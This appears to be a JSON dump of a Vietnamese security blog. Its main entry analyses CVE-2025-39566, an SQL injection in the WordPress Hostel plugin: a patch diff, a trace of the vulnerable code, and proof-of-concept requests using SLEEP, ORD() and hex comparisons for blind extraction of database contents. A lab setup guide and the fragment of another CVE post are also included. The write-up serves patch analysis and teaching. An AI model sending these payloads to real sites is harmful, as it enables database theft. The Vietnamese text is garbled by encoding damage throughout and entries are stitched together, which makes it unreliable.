Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n 